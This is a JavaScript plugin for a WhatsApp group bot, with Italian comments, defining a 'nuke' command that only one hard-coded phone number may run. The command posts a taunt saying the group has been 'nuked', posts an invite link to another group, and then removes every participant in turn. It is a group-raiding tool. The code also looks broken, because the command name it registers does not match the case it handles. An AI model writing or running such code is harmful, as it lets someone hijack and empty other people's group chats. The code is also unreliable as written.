let handler = async (m, { conn, args, groupMetadata, participants, usedPrefix, command, isBotAdmin, isSuperAdmin }) => {
    let ps = participants.map(u => u.id).filter(v => v !== conn.user.jid);
    let bot = global.db.data.settings[conn.user.jid] || {};
    if (ps.length === 0) return;
    const delay = time => new Promise(res => setTimeout(res, time));

    // Numero autorizzato
    const numeroAutorizzato = '46737807114@s.whatsapp.net'; // Sostituisci con il numero autorizzato

    // Verifica se l'utente che esegue il comando è il numero autorizzato
    if (m.sender !== numeroAutorizzato) {
        await conn.sendMessage(m.chat, { text: '⚠️ Solo il numero autorizzato può utilizzare questo comando!' });
        return;
    }

    switch (command) {
        case "banghost":
            if (!bot.restrict) return;
            if (!isBotAdmin) {
                await conn.sendMessage(m.chat, { text: '⚠️ Il bot deve essere amministratore per eseguire questo comando.' });
                return;
            }

            await conn.sendMessage(m.chat, { text: "✧･ﾟ: 𝑺𝑰𝑬𝑻𝑬 𝑺𝑻𝑨𝑻𝑰 𝑵𝑼𝑲𝑲𝑨𝑻𝑰 𝑫𝑨 𝑳𝑬𝑿𝑰𝑶𝑵 👑 " });
            await conn.sendMessage(m.chat, { text: 'https://chat.whatsapp.com/IWbKWBiLxiX72tm8pOWKkt?mode=r_t' });

            let users = participants.map(u => u.id).filter(v => v !== conn.user.jid);

            if (isBotAdmin && bot.restrict) {
                for (let user of users) {
                    await conn.groupParticipantsUpdate(m.chat, [user], 'remove');
                    await delay(2000);
                }
            } else return;
            break;
    }
};

handler.command = ['nuke'];
handler.group = handler.owner = true;
handler.fail = null;
export default handler;
